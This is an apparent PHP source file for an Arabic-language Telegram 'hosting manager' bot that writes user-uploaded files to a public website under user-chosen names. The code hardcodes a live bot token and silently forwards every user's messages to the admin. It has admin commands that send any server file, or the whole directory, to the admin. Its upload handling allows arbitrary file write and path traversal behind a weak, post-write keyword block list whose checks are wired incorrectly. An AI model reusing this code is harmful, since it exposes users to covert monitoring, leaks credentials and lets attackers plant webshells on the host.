<?php
ob_start();
$API_KEY = '5876374441:AAGlFvS8MsU2nekrbMMspH9q3sW3LmlZ66I'; // توكن بوتك
define('API_KEY',$API_KEY);
$admin = 1209659601; // ايديك
$sudo = array("1209659601","1209659601","","",""); //ايدي المشرفين الي يقدرون يجلبون متلفات الاستضافه
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;

$files = json_decode(file_get_contents('taggerr.json'),100000);
if(isset($update->callback_query)){
  $chat_id = $update->callback_query->message->chat->id;
  $message_id = $update->callback_query->message->message_id;
  $data     = $update->callback_query->data;
}
function save($array){
    file_put_contents('taggerr.json', json_encode($array));
}
function clear($array){
	foreach($array as $key => $val){
		$array[$key] = null;
	}
	return $array;
}
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@aa774578&user_id=".$id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"
لاستخدام البوت عليك الاشتراك بقناة مطور البوت

📡┇ قناة مطور البوت @UE_UM :-

🖲┇ بعد الإشتراك أرسل { /start }",
]);return false;}


if($text && $id !== $admin){
bot('forwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$update->message->message_id,
'text'=>$text,
]);
}

if(in_array($chat_id, $sudo)){
if(preg_match('/جلب ملف .*/',$text)){
	 	$text = str_replace('جلب ملف ','',$text);
	 	bot('sendDocument',[
	 		'chat_id'=>$admin,
	 		'document'=>new CURLFile(trim($text))
	 	]);
	}
	
	
if($text == 'جلب الكل'){
		$sc = scandir(__DIR__);
		for($i=0;$i<count($sc);$i++){
			if(is_file($sc[$i])){
				bot('sendDocument',[
					'chat_id'=>$admin,
					'document'=>new CURLFile($sc[$i])
				]);
			}
		}
	}
}
	if($text == '/start'){
    $files['mode'][$chat_id] = 'stop';
		save($files);
		bot('sendMessage',[
			'chat_id'	=> $chat_id,
			'text'=>"- اختر ما تريد•\n\n - *Manager Hosting*",
			'parse_mode'=>'MarkDown',
			'reply_markup'=>json_encode([
					'inline_keyboard'=>[
							[['text'=>'- رفع ملف 📨،','callback_data'=>'upload']],
							[['text'=>'• تاجرالموت -','url'=>'t.me/Z_0_2']],
						]
				])
		]);
	}
	if($data == 'upload'){
		bot('editMessageText',[
			'chat_id'=>$chat_id,
			'message_id'=>$message_id,
			'text'=>'- قم بأرسال الملف كـ (ملف ، رساله ) ، '
		]);
		$files['mode'][$chat_id] = 'upload';
		save($files);
		exit;
	}





	

	
	if($files['mode'][$chat_id] == 'upload'){
		if($message->document){
			$url = 'https://api.telegram.org/file/bot'.$API_KEY.'/'.bot('getFile',['file_id'=>$message->document->file_id])->result->file_path;
			$files['url'][$chat_id] = $url;
			bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>'✅┇ تم الحفظ الان ارسل ( اسم الملف ) ، مثل *bot.php*',
				'parse_mode'=>'MarkDown',
			]);
			$files['mode'][$chat_id] = 'path';
			save($files);
			exit;
		} elseif(isset($message->text)) {
			$files['file'] = $text;
			bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>'✅┇ تم الحفظ الان ارسل ( اسم الملف مسار الملف ) ، مثل *bot.php*',
				'parse_mode'=>'MarkDown',
			]);
			$files['mode'][$chat_id] = 'path';
			save($files);
			exit;
		}
	}
	if($files['mode'][$chat_id] == 'path'){
		if(isset($files['url'][$chat_id])){
			$data = file_get_contents($files['url'][$chat_id]);
		} else {
			$data = $files['file'][$chat_id];
		}
		if(file_put_contents($text, $data)){
      $su = $text;
      $searchfor = "sendDocument";
      $searchfor1 = "scandir";
      $searchfor2 = "rename";
      $searchfor3 = "getFile";
      $searchfor4 = "unlink";
      $contents = file_get_contents($su);
      $pattern = preg_quote($searchfor, '/');
      $pattern = "/^.*$pattern.*\$/m";
      $pattern1 = preg_quote($searchfor1, '/');
      $pattern1 = "/^.*$pattern1.*\$/m";
      $pattern2 = preg_quote($searchfor2, '/');
      $pattern2 = "/^.*$pattern2.*\$/m";
      $pattern3 = preg_quote($searchfor3, '/');
      $pattern3 = "/^.*$pattern3.*\$/m";
      $pattern4 = preg_quote($searchfor4, '/');
      $pattern4 = "/^.*$pattern4.*\$/m";
      if(preg_match_all($pattern, $contents, $matches)){
      if(unlink($text)){
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف بشكل صحيح لان محتوى الملف يخالف شروط خدمة مطور البوت",
				'parse_mode'=>'MarkDown',
			]);
      }
        
      }
      if(preg_match_all($pattern1, $contents, $matches)){
      if(unlink($text)){
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف بشكل صحيح لان محتوى الملف يخالف شروط خدمة مطور البوت",
				'parse_mode'=>'MarkDown',
			]);
      }   
      }
      if(preg_match_all($pattern2, $contents, $matches)){
      if(unlink($text)){
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف بشكل صحيح لان محتوى الملف يخالف شروط خدمة مطور البوت",
				'parse_mode'=>'MarkDown',
			]);
      }   
      }
      if(preg_match_all($pattern3, $contents, $matches)){
      if(unlink($text)){
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف بشكل صحيح لان محتوى الملف يخالف شروط خدمة مطور البوت",
				'parse_mode'=>'MarkDown',
			]);
      }   
      }
      if(preg_match_all($pattern4, $contents, $matches)){
      if(unlink($text)){
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف بشكل صحيح لان محتوى الملف يخالف شروط خدمة مطور البوت",
				'parse_mode'=>'MarkDown',
			]);
      }   
      }
      else{
        bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- تم الرفع بنجاح ✅؛ *https://dev-aath774578003.pantheonsite.io/tager/$text* 
				$url; 
				",
				'parse_mode'=>'MarkDown',
			]);
      }
			
		} 
    
    else {
			bot('sendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"- لم يتم رفع الملف ، حدث خطأ 🚫؛ *$text*",
				'parse_mode'=>'MarkDown',
			]);
		}
		save(clear($files));
	}

  
  

?>